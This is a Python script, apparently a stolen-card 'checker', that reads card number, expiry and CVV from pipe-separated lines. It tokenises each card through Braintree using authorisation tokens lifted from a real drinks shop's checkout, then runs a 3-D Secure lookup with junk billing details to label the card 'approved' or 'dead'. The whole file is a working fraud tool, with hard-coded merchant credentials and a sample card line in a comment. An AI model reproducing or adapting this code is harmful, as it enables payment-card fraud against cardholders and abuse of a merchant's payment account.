import requests
import time


def process_sum(command_data):
    try:
        # تقسيم النص إلى أجزاء بناءً على الفاصل |
        n = command_data.split('|')[0]
        mm = command_data.split('|')[1]
        yy = int(command_data.split('|')[2])
        cvc = command_data.split('|')[3].replace('\n', '')
        if yy < 100:
            yy = yy + 2000
        headers = {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3Mzc1MzM0NDcsImp0aSI6IjYwMDNiNTRlLWQ1YWMtNDliMy05MDc0LTFjZjliYjRhZGVjZiIsInN1YiI6Impmbjk2OGc2cXI4N2ZqcTkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Impmbjk2OGc2cXI4N2ZqcTkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6IndpbmVwbGF0Zm9ybVVTRCJ9fQ.9IjqIRsEhAWnFU4oct6P7KV2SqtVETVvJz3Srsi2p_zzImVhDFmjfi9ftT5_eRMNjF940HjCUuRzy2IiEA-D2g',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://shop.ciprianidrinks.com',
    'priority': 'u=1, i',
    'referer': 'https://shop.ciprianidrinks.com/',
    'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
}
        json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': 'ebb89708-b8d6-4639-b77c-80cf8167bb5d',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',}
        response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

        tok = (response.json()['data']['tokenizeCreditCard']['token'])
        biin = response.json(
        )['data']['tokenizeCreditCard']['creditCard']['bin']
        headers = {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/json',
    'origin': 'https://shop.ciprianidrinks.com',
    'priority': 'u=1, i',
    'referer': 'https://shop.ciprianidrinks.com/',
    'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
}
        json_data = {
    'amount': '107.53',
    'additionalInfo': {
        'acsWindowSize': '03',
        'billingLine1': 'fawfawf',
        'billingCity': 'fawfawfawf',
        'billingState': 'AL',
        'billingPostalCode': '13211',
        'billingCountryCode': 'US',
        'billingPhoneNumber': '21312412',
        'billingGivenName': 'fadaw',
        'billingSurname': 'fwafawfa',
        'email': 'myzyvy@azuretechtalk.net',
    },
    'bin': biin,
    'dfReferenceId': '0_4ada3e11-f3d3-4c97-a2a7-50ecd053b9cf',
    'clientMetadata': {
        'requestedThreeDSecureVersion': '2',
        'sdkVersion': 'web/3.103.0',
        'cardinalDeviceDataCollectionTimeElapsed': 66,
        'issuerDeviceDataCollectionTimeElapsed': 3638,
        'issuerDeviceDataCollectionResult': True,
    },
    'authorizationFingerprint': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3Mzc1MzM0NTEsImp0aSI6Ijc1MzNjMDhjLTJjYjgtNDUxNS1iNTdkLTgzZDQ5NDRiZDE4MSIsInN1YiI6Impmbjk2OGc2cXI4N2ZqcTkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Impmbjk2OGc2cXI4N2ZqcTkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6IndpbmVwbGF0Zm9ybVVTRCJ9fQ.ZmE1V3kMdL-4dY_hjFoQBrxnwYhAFvaGmYItifkjLPGTcvtE761ZZCW9E4zdY4UOkl_NT5avXyUxDBHQmwlUgw',
    'braintreeLibraryVersion': 'braintree/web/3.103.0',
    '_meta': {
        'merchantAppId': 'shop.ciprianidrinks.com',
        'platform': 'web',
        'sdkVersion': '3.103.0',
        'source': 'client',
        'integration': 'custom',
        'integrationType': 'custom',
        'sessionId': '5d8ca7a7-0e46-44d2-b50d-ced1ef198edb',
    },
}

        response = requests.post(f'https://api.braintreegateway.com/merchants/jfn968g6qr87fjq9/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',headers=headers,json=json_data,)
        challange = response.json(
        )['paymentMethod']['threeDSecureInfo']['status']
        if "challenge_required" in challange:
            message = "approved"
        else:
            message = "dead"
        time.sleep(1)
        return message
    except Exception as e:
        return f"حدث خطأ: {str(e)}. تأكد من أن الأمر بصيغة صحيحة."


# aa = '371664327181008|02|2033|6846'
# result = process_sum(aa)
# print(result)
